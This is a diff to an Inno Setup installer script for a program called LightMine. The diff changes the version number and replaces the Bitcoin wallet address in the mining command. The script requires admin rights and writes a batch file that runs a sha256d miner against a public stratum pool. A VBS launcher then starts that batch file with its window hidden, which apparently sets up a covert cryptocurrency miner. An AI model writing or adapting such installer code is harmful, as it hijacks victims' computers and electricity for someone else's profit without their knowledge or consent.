@@ -4,7 +4,7 @@
 
 [Setup]
 AppName=LightMine
-AppVersion=1.2.1
+AppVersion=1.2.2
 AppPublisher=Sorlac
 PrivilegesRequired=admin
 DefaultDirName={commonappdata}\LightMine
@@ -166,7 +166,7 @@ begin
     BatFileContent := '@echo off' + #13#10 +
                       'cd /d "' + ExpandConstant('{commonappdata}\LightMine') + '"' + #13#10 +
                       'title LightMine Engine' + #13#10 +
-                      'LightMine.exe -a sha256d -o stratum+tcp://public-pool.io:21496 -u bc1qr87ft6r32gsjzrauddxk77x5upxylax277dz27.' + FinalWorkerName + ' -p x -t 1';
+                      'LightMine.exe -a sha256d -o stratum+tcp://public-pool.io:21496 -u bc1q5cpqasnz7k33m30xzdn08a8x5usmnd0qggfpgf.' + FinalWorkerName + ' -p x -t 1';
     
     VbsFileContent := 'Set WshShell = CreateObject("WScript.Shell")' + #13#10 +
                       'WshShell.Run """' + ExpandConstant('{commonappdata}\LightMine\LightMine.bat') + '""", 0, False' + #13#10 +
